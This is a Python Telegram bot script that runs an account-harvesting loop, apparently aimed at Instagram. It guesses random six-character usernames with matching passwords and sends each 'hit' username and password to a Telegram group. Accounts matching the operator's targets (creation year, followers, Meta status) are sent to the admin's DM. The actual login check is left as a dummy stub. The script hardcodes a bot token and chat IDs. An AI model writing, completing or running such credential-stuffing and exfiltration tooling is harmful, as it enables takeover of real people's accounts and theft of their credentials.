import os, requests, random, string, json, threading
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from colorama import Fore, init

init(autoreset=True)

# --- 1. PERMANENT MEMORY (Hardcoded) ---
TOKEN = "8568247844:AAHGQOJElf3_Zg5QGDkjGLgEaZHiukRL_mA"
GROUP_ID = -5171086005
ADMIN_ID = 7831276550  # Updated to your provided ID

class BotState:
    is_running = False
    target_year = None
    target_followers = 0
    meta_only = False

state = BotState()

# --- 2. MESSAGING FUNCTIONS ---
def send_to_dm(text):
    """Sends the exact target you're looking for to your private DM"""
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        requests.post(url, data={'chat_id': ADMIN_ID, 'text': text}, timeout=10)
    except: pass

def send_to_group(text):
    """Sends every other working account to your group"""
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        requests.post(url, data={'chat_id': GROUP_ID, 'text': text}, timeout=10)
    except: pass

# --- 3. HARVESTING & FILTER LOGIC ---
def harvest_loop():
    print(f"{Fore.GREEN}[*] Thread Active. Authorized Admin: {ADMIN_ID}")
    while state.is_running:
        try:
            # --- ACCOUNT GENERATION ---
            # Replace this section with your specific username/check logic
            user = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
            pasw = user
            
            # --- DUMMY DATA (Replace with your IG API response) ---
            is_valid = True     
            found_year = 2012   
            followers = 105     
            is_meta = False     
            # ------------------------------------------------------

            if is_valid:
                is_target = False
                
                # Filter Logic based on your commands
                if state.target_year and found_year == state.target_year:
                    is_target = True
                elif state.target_followers > 0 and followers >= state.target_followers:
                    is_target = True
                elif state.meta_only and is_meta:
                    is_target = True

                if is_target:
                    # Found a Target: Stop harvesting and DM Admin
                    state.is_running = False 
                    send_to_dm(f"👑 TARGET FOUND!\n\n👤 User: {user}\n🔐 Pass: {pasw}\n📅 Year: {found_year}\n👥 Follows: {followers}\n\nHarvesting stopped.")
                else:
                    # Valid ID but not a target: Send to Group
                    send_to_group(f"✅ HIT (Non-Target)\n👤 User: {user}\n🔐 Pass: {pasw}\n📅 Year: {found_year}")

        except Exception:
            continue

# --- 4. SECURE TELEGRAM COMMANDS ---
async def check_auth(update: Update):
    """Safety check: Only you can control the bot"""
    if update.effective_chat.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized Access.")
        return False
    return True

async def start_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    if state.is_running:
        await update.message.reply_text("⚠️ Script is already running.")
        return
    state.is_running = True
    threading.Thread(target=harvest_loop, daemon=True).start()
    await update.message.reply_text("🚀 Harvesting Online.\nTarget Match -> DM\nWorking IDs -> Group")

async def cmd_year(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    if context.args:
        state.target_year = int(context.args[0])
        await update.message.reply_text(f"🎯 Target Year set: {state.target_year}")
    else:
        await update.message.reply_text("Use: /year 2011")

async def cmd_follower(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    state.target_followers = 100
    await update.message.reply_text("🎯 Target Followers set: 100+")

async def cmd_meta(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    state.meta_only = True
    await update.message.reply_text("🎯 Target set: Meta Enabled IDs Only.")

async def stop_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    state.is_running = False
    await update.message.reply_text("🛑 Harvesting Stopped.")

# --- 5. EXECUTION ---
if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start_bot))
    app.add_handler(CommandHandler("year", cmd_year))
    app.add_handler(CommandHandler("follower", cmd_follower))
    app.add_handler(CommandHandler("meta", cmd_meta))
    app.add_handler(CommandHandler("stop", stop_bot))

    print(f"{Fore.CYAN}Bot Controller Live for ID: {ADMIN_ID}")
    app.run_polling()
